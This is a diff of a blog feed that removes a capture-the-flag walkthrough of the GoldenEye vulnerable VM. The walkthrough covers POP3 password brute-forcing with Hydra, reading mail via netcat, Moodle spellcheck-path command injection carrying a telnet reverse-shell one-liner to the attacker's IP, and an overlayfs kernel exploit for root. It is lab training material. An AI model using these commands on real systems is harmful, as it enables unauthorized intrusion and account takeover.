-<p>Drop me a line on twitter @dhn_, or via email <a href="&#109;&#97;&#105;&#108;&#116;&#x6f;&#58;&#100;&#x68;&#x6e;&#64;&#x7a;&#101;&#114;&#x30;&#x2d;&#100;&#x61;&#121;&#x2e;&#x70;&#119;">&#x64;&#x68;&#x6e;&#x40;&#122;&#x65;&#x72;&#x30;&#45;&#x64;&#x61;&#121;&#46;&#x70;&#x77;</a></p>
+<p>Drop me a line on twitter @dhn_, or via email <a href="&#x6d;&#97;&#x69;&#x6c;&#116;&#x6f;&#x3a;&#x64;&#x68;&#110;&#64;&#x7a;&#x65;&#x72;&#x30;&#45;&#x64;&#97;&#121;&#46;&#x70;&#119;">&#100;&#104;&#110;&#64;&#x7a;&#101;&#x72;&#x30;&#45;&#100;&#x61;&#x79;&#x2e;&#x70;&#119;</a></p>
 
 <p>Here is your flag: flag2{60d14feef575bacf5fd8eb06ec7cd8e7}
 ```</p>
@@ -1858,400 +2365,6 @@ cat /root/flag.txt
 | including this one.            |
 |                                |
 \ &mdash; Mark Twain                  /</p>
-
-<hr />
-
-<pre><code>    \   ^__^
-     \  (oo)\_______
-        (__)\       )\/\
-            ||----w |
-            ||     ||
-</code></pre>
-
-<p>```</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[GoldenEye 007]]></title>
-    <link href="http://chousensha.github.io/blog/2019/04/02/goldeneye-007/"/>
-    <updated>2019-04-02T21:57:39+03:00</updated>
-    <id>http://chousensha.github.io/blog/2019/04/02/goldeneye-007</id>
-    <content type="html"><![CDATA[<p>Today&rsquo;s VM is inspired by a James Bond movie:</p>
-
-<blockquote><p>I recently got done creating an OSCP type vulnerable machine that&rsquo;s themed after the great James Bond film (and even better n64 game) GoldenEye.
-The goal is to get root and capture the secret GoldenEye codes &ndash; flag.txt.</p>
-
-<p>I&rsquo;d rate it as Intermediate, it has a good variety of techniques needed to get root &ndash; no exploit development/buffer overflows. After completing
-the OSCP I think this would be a great one to practice on, plus there&rsquo;s a hint of CTF flavor.</p></blockquote>
-
-<!-- more -->
-
-
-<p><code>
-PORT      STATE SERVICE     VERSION
-25/tcp    open  smtp        Postfix smtpd
-|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
-|_ssl-date: TLS randomness does not represent time
-80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
-|_http-server-header: Apache/2.4.7 (Ubuntu)
-|_http-title: GoldenEye Primary Admin Server
-55006/tcp open  ssl/unknown
-|_ssl-date: TLS randomness does not represent time
-55007/tcp open  pop3        Dovecot pop3d
-|_pop3-capabilities: SASL(PLAIN) USER AUTH-RESP-CODE CAPA STLS UIDL PIPELINING RESP-CODES TOP
-|_ssl-date: TLS randomness does not represent time
-</code></p>
-
-<p>Navigating to the web server takes you to this screen:</p>
-
-<p><img class="center" src="/images/pentest/goldeneye/web.png" title="&lsquo;goldeneye web&rsquo; &lsquo;goldeneye web&rsquo;" ></p>
-
-<p>In the source code of the page there&rsquo;s a linked <em>terminal.js</em> file. Viewing that reveals some interesting comments:</p>
-
-<p><code>html
-//
-//Boris, make sure you update your default password.
-//My sources say MI6 maybe planning to infiltrate.
-//Be on the lookout for any suspicious network traffic....
-//
-//I encoded you p@ssword below...
-//
-//&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;
-//
-//BTW Natalya says she can break your codes
-//
-</code></p>
-
-<p>So we have a HTML encoded password which decodes to <code>InvincibleHack3r</code>. Now we can go to <em>/sev-home</em> and log in as boris with this password.</p>
-
-<p><img class="center" src="/images/pentest/goldeneye/goldeneye.png" title="&lsquo;goldeneye login&rsquo; &lsquo;goldeneye login&rsquo;" ></p>
-
-<p>We can now make use of that POP3 service on port 55007. Boris' credentials didn&rsquo;t work though. I used Nikto to further look at the web server and got an interesting hit:</p>
-
-<p><code>
-+ /splashAdmin.php: Cobalt Qube 3 admin is running. This may have multiple security problems as described by www.scan-associates.net. These could not be tested remotely.
-</code></p>
-
-<p>Going to that page wasn&rsquo;t immediately useful though, but maybe some of the information could be used further:</p>
-
-<p><img class="center" src="/images/pentest/goldeneye/splashadmin.png" title="&lsquo;splashadmin&rsquo; &lsquo;splashadmin&rsquo;" ></p>
-
-<p>With nothing else to go from, I attempted to bruteforce the mail login credentials for boris with the Metasploit <em>scanner/pop3/pop3_login</em> module and the <em>fasttrack.txt</em> wordlist:</p>
-
-<p><code>
-[+] 192.168.159.130:55007 - 192.168.159.130:55007 - Success: 'boris:secret1!' '+OK Logged in.  '
-</code></p>
-
-<p>So now we have credentials for Boris' mail and I was able to read his mails:</p>
-
-<p>```
-nc 192.168.159.130 55007
-+OK GoldenEye POP3 Electronic-Mail System
-USER boris
-+OK
-PASS secret1!
-+OK Logged in.
-LIST
-+OK 3 messages:
-1 544
-2 373
-3 921
-.
-RETR 1
-+OK 544 octets
-Return-Path: <a href="&#109;&#97;&#105;&#x6c;&#116;&#x6f;&#x3a;&#x72;&#111;&#111;&#x74;&#x40;&#x31;&#50;&#55;&#x2e;&#x30;&#46;&#x30;&#x2e;&#49;&#46;&#103;&#x6f;&#108;&#100;&#101;&#110;&#101;&#121;&#x65;">&#114;&#111;&#111;&#x74;&#64;&#x31;&#50;&#x37;&#46;&#x30;&#46;&#x30;&#46;&#x31;&#46;&#x67;&#111;&#108;&#100;&#x65;&#110;&#x65;&#121;&#101;</a>
-X-Original-To: boris
-Delivered-To: boris@ubuntu
-Received: from ok (localhost [127.0.0.1])</p>
-
-<pre><code>by ubuntu (Postfix) with SMTP id D9E47454B1
-for &lt;boris&gt;; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
-</code></pre>
-
-<p>Message-Id: &lt;20180425022326.D9E47454B1@ubuntu>
-Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
-From: <a href="&#x6d;&#97;&#105;&#108;&#116;&#111;&#x3a;&#114;&#111;&#x6f;&#x74;&#x40;&#x31;&#x32;&#55;&#x2e;&#48;&#x2e;&#48;&#46;&#49;&#46;&#103;&#111;&#108;&#100;&#101;&#x6e;&#x65;&#121;&#x65;">&#x72;&#111;&#x6f;&#x74;&#64;&#49;&#50;&#55;&#46;&#48;&#x2e;&#x30;&#x2e;&#49;&#46;&#103;&#x6f;&#x6c;&#100;&#x65;&#x6e;&#x65;&#x79;&#x65;</a></p>
-
-<p>Boris, this is admin. You can electronically communicate to co-workers and students here. I&rsquo;m not going to scan emails for security risks because I trust you and the other admins here.
-.
-RETR 2
-+OK 373 octets
-Return-Path: &lt;natalya@ubuntu>
-X-Original-To: boris
-Delivered-To: boris@ubuntu
-Received: from ok (localhost [127.0.0.1])</p>
-
-<pre><code>by ubuntu (Postfix) with ESMTP id C3F2B454B1
-for &lt;boris&gt;; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
-</code></pre>
-
-<p>Message-Id: &lt;20180425024249.C3F2B454B1@ubuntu>
-Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
-From: natalya@ubuntu</p>
-
-<p>Boris, I can break your codes!
-.
-RETR 3
-+OK 921 octets
-Return-Path: <a href="&#x6d;&#97;&#x69;&#108;&#x74;&#x6f;&#x3a;&#97;&#x6c;&#x65;&#x63;&#x40;&#x6a;&#97;&#x6e;&#x75;&#115;&#46;&#x62;&#x6f;&#x73;&#x73;">&#x61;&#108;&#101;&#x63;&#x40;&#x6a;&#97;&#x6e;&#117;&#115;&#x2e;&#98;&#111;&#115;&#x73;</a>
-X-Original-To: boris
-Delivered-To: boris@ubuntu
-Received: from janus (localhost [127.0.0.1])</p>
-
-<pre><code>by ubuntu (Postfix) with ESMTP id 4B9F4454B1
-for &lt;boris&gt;; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
-</code></pre>
-
-<p>Message-Id: &lt;20180425025235.4B9F4454B1@ubuntu>
-Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
-From: <a href="&#109;&#x61;&#x69;&#x6c;&#116;&#111;&#58;&#97;&#108;&#x65;&#99;&#64;&#106;&#x61;&#x6e;&#x75;&#115;&#x2e;&#x62;&#111;&#x73;&#115;">&#97;&#108;&#x65;&#99;&#x40;&#x6a;&#x61;&#x6e;&#117;&#x73;&#46;&#x62;&#111;&#x73;&#115;</a></p>
-
-<p>Boris,</p>
-
-<p>Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!</p>
-
-<p>Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages&hellip;.</p>
-
-<p>PS &ndash; Keep security tight or we will be compromised.
-```</p>
-
-<p>We now know to look for access codes once we get a shell on the target. We also learned there&rsquo;s another username on the ubuntu domain: natalya. So I kicked off the bruteforce for her account as well, this time with Hydra, because I wasn&rsquo;t happy with the speed of the Metasploit module.</p>
-
-<p><code>
-hydra -l natalya -P /usr/share/wordlists/fasttrack.txt 192.168.159.130 -s 55007 pop3 -f
-[55007][pop3] host: 192.168.159.130   login: natalya   password: bird
-</code></p>
-
-<p>Got lucky with natalya as well. Now back to reading emails:</p>
-
-<p>```
-nc 192.168.159.130 55007
-+OK GoldenEye POP3 Electronic-Mail System
-USER natalya
-+OK
-PASS bird
-+OK Logged in.
-LIST
-+OK 2 messages:
-1 631
-2 1048
-.
-RETR 1
-+OK 631 octets
-Return-Path: &lt;root@ubuntu>
-X-Original-To: natalya
-Delivered-To: natalya@ubuntu
-Received: from ok (localhost [127.0.0.1])</p>
-
-<pre><code>by ubuntu (Postfix) with ESMTP id D5EDA454B1
-for &lt;natalya&gt;; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
-</code></pre>
-
-<p>Message-Id: &lt;20180425024542.D5EDA454B1@ubuntu>
-Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
-From: root@ubuntu</p>
-
-<p>Natalya, please you need to stop breaking boris' codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.</p>
-
-<p>Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.
-.
-RETR 2
-+OK 1048 octets
-Return-Path: &lt;root@ubuntu>
-X-Original-To: natalya
-Delivered-To: natalya@ubuntu
-Received: from root (localhost [127.0.0.1])</p>
-
-<pre><code>by ubuntu (Postfix) with SMTP id 17C96454B1
-for &lt;natalya&gt;; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
-</code></pre>
-
-<p>Message-Id: &lt;20180425031956.17C96454B1@ubuntu>
-Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
-From: root@ubuntu</p>
-
-<p>Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it&rsquo;s related to security&hellip;even if it&rsquo;s not, just enter it in under the guise of &ldquo;security&rdquo;&hellip;it&rsquo;ll get the change order escalated without much hassle :)</p>
-
-<p>Ok, user creds are:</p>
-
-<p>username: xenia
-password: RCP90rulez!</p>
-
-<p>Boris verified her as a valid contractor so just create the account ok?</p>
-
-<p>And if you didn&rsquo;t have the URL on outr internal Domain: severnaya-station.com/gnocertdir
-**Make sure to edit your host file since you usually work remote off-network&hellip;.</p>
-
-<p>Since you&rsquo;re a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.
-```</p>
-
-<p>Now we&rsquo;ve learned some interesting things..it seems Boris is a double agent! We now have a new set of credentials: <code>xenia:RCP90rulez!</code> and the internal domain for which we have to add an entry in our hosts file. With that done, going to the URL took me to a training portal:</p>
-
-<p><img class="center" src="/images/pentest/goldeneye/moodle.png" title="&lsquo;moodle&rsquo; &lsquo;moodle&rsquo;" ></p>
-
-<p>We can log in as Xenia and find a message on the platform:</p>
-
-<p>```
-Tuesday, 24 April 2018
-09:24 PM: Greetings Xenia,</p>
-
-<p>As a new Contractor to our GoldenEye training I welcome you. Once your account has been complete, more courses will appear on your dashboard. If you have any questions message me via email, not here.</p>
-
-<p>My email username is&hellip;</p>
-
-<p>doak</p>
-
-<p>Thank you,</p>
-
-<p>Cheers,</p>
-
-<p>Dr. Doak &ldquo;The Doctor&rdquo;
-```</p>
-
-<p>We have a new mail username and by now we know what&rsquo;s coming..</p>
-
-<p><code>
-[55007][pop3] host: 192.168.159.130   login: doak   password: goat
-</code></p>
-
-<p>There&rsquo;s only one mail, but it contains portal credentials:</p>
-
-<p>```
-Return-Path: &lt;doak@ubuntu>
-X-Original-To: doak
-Delivered-To: doak@ubuntu
-Received: from doak (localhost [127.0.0.1])</p>
-
-<pre><code>by ubuntu (Postfix) with SMTP id 97DC24549D
-for &lt;doak&gt;; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
-</code></pre>
-
-<p>Message-Id: &lt;20180425034731.97DC24549D@ubuntu>
-Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
-From: doak@ubuntu</p>
-
-<p>James,
-If you&rsquo;re reading this, congrats you&rsquo;ve gotten this far. You know how tradecraft works right?</p>
-
-<p>Because I don&rsquo;t. Go to our training site and login to my account&hellip;.dig until you can exfiltrate further information&hellip;&hellip;</p>
-
-<p>username: dr_doak
-password: 4England!
-```</p>
-
-<p>Look around until you find a secret file inside My private files:</p>
-
-<p><img class="center" src="/images/pentest/goldeneye/secret.png" title="&lsquo;secret&rsquo; &lsquo;secret&rsquo;" ></p>
-
-<p>The contents are:</p>
-
-<p>```
-007,</p>
-
-<p>I was able to capture this apps adm1n cr3ds through clear txt.</p>
-
-<p>Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here.</p>
-
-<p>Something juicy is located here: /dir007key/for-007.jpg</p>
-
-<p>Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.
-```</p>
-
-<p>The image most likely has hidden data within:</p>
-
-<p><img class="center" src="/images/pentest/goldeneye/for-007.jpg" title="&lsquo;message for 007&rsquo; &lsquo;message for 007&rsquo;" ></p>
-
-<p>Running strings on the image reveals a base64 string: <em>eFdpbnRlcjE5OTV4IQ==</em>, which is decoded to <code>xWinter1995x!</code>. Now we can log in as admin to the platform. After some more recon, it seems that we can achieve RCE with a Metasploit exploit for Moodle:</p>
-
-<blockquote><p>Moodle allows an authenticated user to define spellcheck settings via the web interface. The user can update the spellcheck mechanism to point
-to a system-installed aspell binary. By updating the path for the spellchecker to an arbitrary command, an attacker can run arbitrary commands
-in the context of the web application upon spellchecking requests. This module also allows an attacker to leverage another privilege escalation
-vuln. Using the referenced XSS vuln, an unprivileged authenticated user can steal an admin sesskey and use this to escalate privileges to that
-of an admin, allowing the module to pop a shell as a previously unprivileged authenticated user. This module was tested against Moodle version
-2.5.2 and 2.2.3.</p></blockquote>
-
-<p>The admin account we hijacked has the necessary privileges, so we can use this exploit.</p>
-
-<p>```
-Module options (exploit/multi/http/moodle_cmd_exec):</p>
-
-<p>   Name       Current Setting        Required  Description</p>
-
-<hr />
-
-<p>   PASSWORD   xWinter1995x!          yes       Password to authenticate with
-   Proxies                           no        A proxy chain of format type:host:port[,type:host:port][&hellip;]
-   RHOSTS     severnaya-station.com  yes       The target address range or CIDR identifier
-   RPORT      80                     yes       The target port (TCP)
-   SESSKEY                           no        The session key of the user to impersonate
-   SSL        false                  no        Negotiate SSL/TLS for outgoing connections
-   TARGETURI  /gnocertdir            yes       The URI of the Moodle installation
-   USERNAME   admin                  yes       Username to authenticate with
-   VHOST                             no        HTTP server virtual host
-```</p>
-
-<p>It seemed straightforward, but the exploit failed to run for me. I looked over the source code and saw that the spellcheck engine that is set by the exploit is PSpellShell. By default on the site, the TinyMCE HTML editor spell engine selected was Google Spell. So I manually changed this and ran the exploit again, but it still didn&rsquo;t work. So I did it manually. Recall this part:</p>
-
-<blockquote><p>By updating the path for the spellchecker to an arbitrary command, an attacker can run arbitrary commands in the context of the web application
-upon spellchecking requests</p></blockquote>
-
-<p>Under Server &ndash;> System paths, I edited the <strong>Path to aspell</strong> field with this reverse shell one-liner (had to cycle through a couple before finding one that worked): <code>sh -c &lsquo;(mknod /tmp/backpipe p 2> /dev/null &amp;&amp; /bin/bash 0</tmp/backpipe | telnet 192.168.159.129 8080 1>/tmp/backpipe &amp;)&rsquo;</code></p>
-
-<p>Now if you go to Blogs and add a new entry, you can invoke the spellchecker by clicking on the spellcheck button:</p>
-
-<p><img class="center" src="/images/pentest/goldeneye/spellcheck.png" title="&lsquo;spellcheck&rsquo; &lsquo;spellcheck&rsquo;" ></p>
-
-<p>And you should receive a shell on your listener. I upgraded it to a proper one:</p>
-
-<p><code>
-nc -vnlp 8080
-listening on [any] 8080 ...
-connect to [192.168.159.129] from (UNKNOWN) [192.168.159.130] 54586
-whoami
-www-data
-python -c 'import pty;pty.spawn("/bin/bash")'
-&lt;ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$
-</code></p>
-
-<p>The kernel version is really old:</p>
-
-<p><code>
-uname -a
-Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
-</code></p>
-
-<p>I used the <a href="https://www.exploit-db.com/exploits/37292">overlayfs</a> exploit. There was no GCC on the box, but remember that webpage that mentioned clang. I compiled the exploit with clang: <code>clang 37292.c</code>. There were 5 warnings generated, but an executable a.out was generated. However, it didn&rsquo;t give me a root shell. When I looked through the exploit source code, I found a gcc reference:</p>
-
-<p><code>c
-lib = system("gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");
-</code></p>
-
-<p>Replacing gcc with cc (the default compiler) in this line and recompiling the code worked and I got root. Then I found the secret codes inside a hidden file in /root:</p>
-
-<p>```</p>
-
-<h1>cat /root/.flag.txt</h1>
-
-<p>cat /root/.flag.txt
-Alec told me to place the codes here:</p>
-
-<p>568628e0d993b1973adc718237da6e93</p>
-
-<p>If you captured this make sure to go here&hellip;..
-/006-final/xvf7-flag/
-```</p>
-
-<p>Visit that path on the web server and mission accomplished!</p>
-
-<p><img class="center" src="/images/pentest/goldeneye/flag.png" title="&lsquo;flag&rsquo; &lsquo;flag&rsquo;" ></p>
-
-<p>```</p>
-
-<hr />
-
-<p>/ Excellent time to become a missing \
-\ person.                            /</p>
 
 <hr />
 
